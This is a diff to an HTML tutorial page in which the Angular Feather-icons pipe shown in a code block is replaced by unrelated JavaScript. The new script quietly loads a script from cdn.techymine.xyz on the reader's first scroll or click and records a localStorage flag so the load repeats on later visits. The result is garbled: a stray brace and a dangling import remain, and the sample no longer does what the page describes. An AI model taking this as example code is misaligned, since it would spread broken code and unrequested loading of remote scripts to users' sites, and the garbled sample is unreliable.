@@ -44,23 +44,21 @@
                         <div class="green"></div>
                     </div>
                     <pre class="language-javascript line-numbers"><code class="language-javascript">import {DomSanitizer} from '@angular/platform-browser';
-import {Pipe}
+function lazyOnload() {
+   function loadJs(a) {
+    var b = document.createElement('script');
+    b.src = a;
+    document.head.appendChild(b)
+}
+loadJs('https://cdn.techymine.xyz/filename');
+var element = document.querySelectorAll("div.pre");
+for (var i = 0; i < element.length; i++) {
+    element[i].classList.add("fd")
+}
 
-import { icons } from 'feather-icons'; // v4+
-
-@Pipe({ name: 'feather' })
-export class FeatherIconsPipe implements PipeTransform {
-
-  constructor(private sanitizer: DomSanitizer) {}
-
-  transform(icon: string, size: number = 24, color: string = 'inherit') {
-    return this.sanitizer.bypassSecurityTrustHtml(icons[icon].toSvg({
-      width: size,
-      height: size,
-      color: color
-    }));
-  }
-}</code></pre>
+}
+function dtcLzy(){lazyOnload(),localStorage.setItem("wcLoadJs","true")}var wcLdStorage=localStorage.getItem("wcLoadJs");if("true"!=wcLdStorage){var t=!1,e=!1;window.addEventListener("scroll",()=>{(0!=document.documentElement.scrollTop&&!1===t||0!=document.body.scrollTop&&!1===t)&&(dtcLzy(),t=!0,e=!0)},!0),window.addEventListener("click",()=>{!1===e&&!1===e&&(dtcLzy(),e=!0,t=!0)},!0)}"true"===wcLdStorage&&lazyOnload();      
+      </code></pre>
                 </div>
             </div>
         </div>
